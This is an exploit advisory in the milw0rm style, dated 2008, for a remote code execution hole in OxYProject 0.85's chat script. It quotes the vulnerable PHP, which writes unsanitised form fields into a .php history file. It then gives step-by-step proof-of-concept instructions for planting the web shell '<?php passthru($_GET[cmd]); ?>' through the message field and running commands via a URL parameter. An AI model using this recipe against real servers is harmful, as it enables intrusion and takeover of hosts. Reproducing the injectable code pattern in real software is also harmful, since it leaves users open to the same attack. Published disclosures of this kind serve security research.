@@ -1,0 +1,32 @@
+OxYProject 0.85 (edithistory.php) Remote Code Execution Vulnerability
+Script : http://puzzle.dl.sourceforge.net/sourceforge/oxyproject/OxYBox085uns.zip
+Code Vuln  :
+###################Ln 24###################
+include('oxycfg.php');
+
+//########################################
+//	Editing the Chat History
+//########################################
+
+$edit_file = $file['Chat_History'];
+$fh = fopen($edit_file, 'a') or die("<meta http-equiv=\"refresh\" content=\"1 ;url=oxybox_submit.php\"><font face=\"arial\">Error occured when submitting your message. <a href=\"javascript: history.go(-1)\">Back</a></font>");
+fwrite($fh, "<b><font face=\"arial\" color=" . $_POST["usercolor"] . ">" . $_POST["oxyname"] . " :</font></b> <font color=" . $_POST["msgcolor"] . ">" . $_POST["oxymsg"] . "</font><br>");
+fclose($fh);
+###################Ln 33###################
+In The Page "oxycfg.php"
+###################Ln 33###################
+$file['Chat_History'] = "oxyhistory.php";
+###################Ln 23###################
+POC :
+Go :-> http://localhost/1/OxYBox085uns/0.85/edithistory.php 
+You'll see In this Page
+Username [?]                      Your message has been successfully submitted [X]
+              Your Message Here
+Username Color [?]  black     Enter Message
+In The "Username" Write "Gold_M" 
+In The "Your Message Here" Write This Code "<?php passthru($_GET[cmd]); ?>"
+Afte All this Click  "Enter Message"
+Now Go :-> http://localhost/OxYBox085uns/0.85/oxyhistory.php?cmd=dir
+# Thanx To TryagOxY
+
+# milw0rm.com [2008-04-30]
